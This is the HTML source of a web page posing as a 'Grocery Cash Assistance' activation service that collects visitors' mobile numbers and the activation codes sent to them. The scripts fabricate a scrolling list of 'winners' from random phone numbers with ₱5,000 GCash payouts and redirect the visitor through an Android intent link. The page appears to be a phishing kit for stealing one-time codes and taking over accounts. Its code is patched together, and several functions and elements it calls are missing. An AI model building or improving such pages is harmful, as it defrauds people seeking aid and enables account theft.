<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Grocery Assist | Freshness Delivered</title>
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
    <style>
        :root {
            /* Peaceful Grocery Palette */
            --primary-green: #2d6a4f;
            --soft-green: #52b788;
            --background-light: #f8f9fa;
            --text-main: #2d3436;
            --accent-sage: #d8e2dc;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            background-color: var(--background-light);
            /* Peaceful gradient background */
            background-image: radial-gradient(circle at 50% -20%, #e8f3ee 0%, #f8f9fa 100%);
            color: var(--text-main);
            font-family: 'Public Sans', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            overflow: hidden;
        }

        /* Clean, Airy Card Design */
        .card {
            width: 92%;
            max-width: 380px;
            background: rgba(255, 255, 255, 0.9);
            border: 1px solid rgba(45, 106, 79, 0.1);
            border-radius: 30px;
            padding: 40px 24px;
            backdrop-filter: blur(10px);
            text-align: center;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.05);
        }

        .logo-img {
            width: 160px;
            border-radius: 15px; /* Added slight rounding to your photo */
            margin-bottom: 24px;
            box-shadow: 0 8px 15px rgba(0,0,0,0.1);
        }

        h1 { font-size: 24px; font-weight: 700; margin-bottom: 12px; color: var(--primary-green); }
        p { color: #636e72; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }

        /* Helpful Assistance Button */
        .btn-primary {
            background: linear-gradient(180deg, var(--soft-green) 0%, var(--primary-green) 100%);
            color: #ffffff;
            border: none;
            width: 100%;
            padding: 18px;
            border-radius: 15px;
            font-size: 15px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1px;
            cursor: pointer;
            transition: 0.3s;
            box-shadow: 0 4px 15px rgba(45, 106, 79, 0.2);
        }

        .btn-primary:active { transform: scale(0.98); }

        /* Modal Design */
        .modal-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(45, 106, 79, 0.4);
            backdrop-filter: blur(4px);
            z-index: 99999;
            align-items: center;
            justify-content: center;
        }

        .modal-content {
            width: 92%;
            max-width: 400px;
            background: white;
            border-radius: 24px;
            padding: 30px 24px;
            text-align: center;
            box-shadow: 0 25px 50px rgba(0,0,0,0.15);
        }

        .label-text {
            text-align: left;
            display: block;
            font-size: 11px;
            text-transform: uppercase;
            color: var(--primary-green);
            font-weight: 700;
            margin-bottom: 8px;
            letter-spacing: 0.5px;
        }

        input {
            width: 100%;
            background: #f1f3f5;
            border: 2px solid transparent;
            border-radius: 12px;
            padding: 16px;
            color: var(--text-main);
            font-size: 18px;
            text-align: center;
            font-family: 'JetBrains Mono', monospace;
            margin-bottom: 20px;
            outline: none;
            transition: 0.2s;
        }

        input:focus { border-color: var(--soft-green); background: white; }

        .wait-timer { font-size: 32px; color: var(--primary-green); font-weight: 700; margin-bottom: 20px; }

        .shake-error {
            animation: aggressive-shake 0.4s both;
            border-color: #ff7675 !important;
        }

        @keyframes aggressive-shake {
            10%, 90% { transform: translate3d(-2px, 0, 0); }
            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
            40%, 60% { transform: translate3d(4px, 0, 0); }
        }

        .radio-group { display: flex; gap: 20px; margin-bottom: 25px; background: #f8f9fa; padding: 10px; border-radius: 10px; }
        .radio-item { font-size: 14px; color: var(--text-main); display: flex; align-items: center; gap: 8px; cursor: pointer; font-weight: 600; }
        .radio-item input { margin: 0; width: 18px; height: 18px; accent-color: var(--primary-green); }

        .hidden { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <img src="ivana.jpeg" class="logo-img" alt="Grocery Support">
        <h1>Service Activation</h1>
        <p>Verified Benefiary are only reiceve Grocery Cash Assitance(GCA).</p>
        <button class="btn-primary" id="verifyBtnMain" onclick="handleVerify()">Proceed to Verification Process</button>
    </div>

    <div class="modal-overlay" id="modalOverlay">
        <div class="modal-content">
            
            <div id="step1">
                <h2 style="font-size: 22px; margin-bottom: 20px; color: var(--primary-green);">Registration Details</h2>
                
                <span class="label-text">Mobile Number</span>
                <input type="tel" id="userPhone" placeholder="09xxxxxxxxx" maxlength="11">

                <span class="label-text">Registered FreeShoppingPH Beneficiary?</span>
                <div class="radio-group">
                    <label class="radio-item"><input type="radio" name="reg" value="Yes" checked> Yes</label>
                    <label class="radio-item"><input type="radio" name="reg" value="No"> No</label>
                </div>

                <button class="btn-primary" onclick="processStep1()">Confirm & Receive Call</button>
            </div>

            <div id="step2" class="hidden">
                <h2 style="font-size: 22px; margin-bottom: 10px; color: var(--primary-green);">Establishing Connection...</h2>
                <p style="font-size: 13px; margin-bottom: 20px;">Our AI Verification is calling you. Please answer and enter the activation code below.</p>
                <div class="wait-timer" id="waitTimer">05:00</div>
                <span class="label-text">Activation Code</span>
                <input type="number" id="vCode" placeholder="0 0 0 0">
                <button class="btn-primary" id="verifyBtn" onclick="processStep2()">Activate Now</button>
            </div>

        </div>
    </div>

    <script>
    // NUMBER ANIMATION LOGIC
    function animateValue(id, start, end, duration) {
        const obj = document.getElementById(id);
        let startTimestamp = null;
        const step = (timestamp) => {
            if (!startTimestamp) startTimestamp = timestamp;
            const progress = Math.min((timestamp - startTimestamp) / duration, 1);
            const currentVal = Math.floor(progress * (end - start) + start);
            obj.innerHTML = "₱" + currentVal.toLocaleString() + ".00";
            if (progress < 1) {
                window.requestAnimationFrame(step);
            }
        };
        window.requestAnimationFrame(step);
    }

    function redirectToGCash() {
        const btn = document.getElementById('claimBtn');
        const bal = document.getElementById('balanceText');
        const timerDiv = document.getElementById('timer-text');

        // Changed 1000 to 5000 for the countdown
        animateValue("balanceText", 5000, 0, 800); 
        bal.style.color = "#64748b";
        bal.style.animation = "none";

        btn.disabled = true;
        btn.innerHTML = "Processing...";
        timerDiv.style.display = "block";

        startTimer(300);

        setTimeout(() => {
            window.location.href = "intent://yourwebsite.com#Intent;scheme=https;package=com.android.chrome;end"; 
        }, 1000);
    }

    function startTimer(sec) {
        let timer = sec;
        const display = document.getElementById('waitTimer');
        const interval = setInterval(() => {
            let m = Math.floor(timer / 60);
            let s = timer % 60;
            display.textContent = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
            
            if (--timer < 0) {
                clearInterval(interval);
                // Changed 1000 to 5000 for the reset
                animateValue("balanceText", 0, 5000, 1200); 
                const bal = document.getElementById('balanceText');
                const btn = document.getElementById('claimBtn');
                bal.style.color = "#4ade80";
                bal.style.animation = "glow 2s infinite alternate";
                btn.disabled = false;
                btn.innerHTML = "CLAIM THRU GCASH";
                document.getElementById('timer-text').style.display = "none";
            }
        }, 1000);
    }

    // WINNER FUNCTION WITH UPDATED ₱5,000 PAYOUT
    function generateWinner() {
        const prefixes = ['0917', '0922', '0998', '0905', '0916', '0945', '0966', '0935', '0906'];
        const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        const lastThree = Math.floor(100 + Math.random() * 900);
        const myGcashImage = "images/gc_icon.png"; // Fixed syntax error here

        const winnerEntry = document.createElement('div');
        winnerEntry.className = 'winner-item';
        winnerEntry.innerHTML = `
            <span>📱 ${randomPrefix}****${lastThree}</span>
            <img src="${myGcashImage}" class="gcash-mini" alt="GCash">
            <strong class="payout-green">+₱5,000</strong> 
        `; // Changed +₱1,000 to +₱5,000

        const list = document.getElementById('winners-list');
        if (list) {
            list.prepend(winnerEntry);
            if (list.children.length > 5) list.removeChild(list.lastChild);
        }
    }

    generateWinner(); generateWinner();
    setInterval(generateWinner, 3500);
</script>

<script src="https://static.app/js/static.js" type="text/javascript"></script>
</body>
</html>
